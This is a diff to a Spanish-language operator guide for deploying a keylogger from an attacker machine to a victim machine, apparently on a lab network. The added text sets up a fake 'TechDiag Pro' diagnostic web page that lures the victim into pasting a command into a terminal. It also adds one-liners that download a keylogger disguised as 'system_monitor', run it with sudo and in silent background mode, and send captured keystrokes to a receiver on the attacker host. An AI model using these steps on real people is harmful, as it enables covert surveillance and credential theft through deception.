@@ -15,11 +15,26 @@
 # 1. Iniciar servidor receptor (puerto 8080)
 python3 data_receiver.py --port 8080
 
-# 2. Servir archivos para descargar (puerto 8000)
+# 2. Servir archivos CON INTERFAZ WEB (puerto 8000)
 python3 -m http.server 8000
+
+# 3. Verificar interfaz web (opcional)
+# Abrir navegador en: http://10.0.2.15:8000
 
 ## COMANDOS PARA MÁQUINA VÍCTIMA (10.0.2.4)
 # ==========================================
+
+# 🌐 OPCIÓN A: VÍA INTERFAZ WEB (RECOMENDADA - MÁS PROFESIONAL)
+# =============================================================
+# 1. Abrir navegador en máquina víctima
+# 2. Ir a: http://10.0.2.15:8000
+# 3. Ver la interfaz "TechDiag Pro - Sistema de Diagnóstico Empresarial"
+# 4. Hacer clic en "Iniciar Diagnóstico Completo" o "Diagnóstico Rápido"
+# 5. Seguir las instrucciones mostradas en pantalla
+# 6. Copiar y pegar el comando generado en la terminal
+
+# 💻 OPCIÓN B: COMANDO DIRECTO (BACKUP)
+# =====================================
 
 # Opción 1: Comando que se pide pegar en la consola
 
@@ -35,6 +50,23 @@ wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.0.2.15:8000/
 
 
 
+## ALTERNATIVA: EJECUTABLE STANDALONE (SIN DEPENDENCIAS)
+# =====================================================
+
+# Opción E: Ejecutable compilado (MÁS SIMPLE PARA LA VÍCTIMA)
+# En atacante, compilar primero:
+python3 build_keylogger_new.py
+
+# Luego servir el ejecutable:
+python3 -m http.server 8000
+
+# En víctima (UN SOLO COMANDO):
+wget http://10.0.2.15:8000/dist/system_monitor && chmod +x system_monitor && sudo ./system_monitor
+
+# O transferir directamente:
+scp dist/system_monitor usuario@10.0.2.4:/tmp/ && ssh usuario@10.0.2.4 'sudo /tmp/system_monitor'
+
+
 ## VERIFICACIÓN DE CONECTIVIDAD
 # =============================
 
@@ -48,13 +80,29 @@ ping 10.0.2.4
 ## Flujo
 # ===============================
 
+🌐 FLUJO RECOMENDADO (CON INTERFAZ WEB):
+========================================
+
 1. En atacante (10.0.2.15):
    - Terminal 1: python3 data_receiver.py --port 8080
    - Terminal 2: python3 -m http.server 8000
+   - Opcional: Verificar en navegador -> http://10.0.2.15:8000
 
 2. En víctima (10.0.2.4):
-   - wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.0.2.15:8000/
+   - Abrir navegador
+   - Ir a: http://10.0.2.15:8000
+   - Ver interfaz "TechDiag Pro"
+   - Hacer clic en "Iniciar Diagnóstico Completo"
+   - Copiar comando mostrado y pegarlo en terminal
 
 3. Monitorear resultados en atacante:
-   - Los datos aparecerán en received_data/ o también podrían verse en la previsualización del monitoreo
+   - Los datos aparecerán en received_data/
+   - Ver preview en tiempo real en la consola del receptor
+
+💻 FLUJO ALTERNATIVO (LÍNEA DE COMANDOS):
+========================================
+
+1. En atacante: Igual que arriba
+2. En víctima: wget -q http://10.0.2.15:8000/system_monitor.py http://10.0.2.15:8000/reconstructor.py && sudo apt install -y python3-pynput python3-requests >/dev/null 2>&1 && sudo python3 system_monitor.py --silent &
+3. Monitorear: Igual que arriba
 
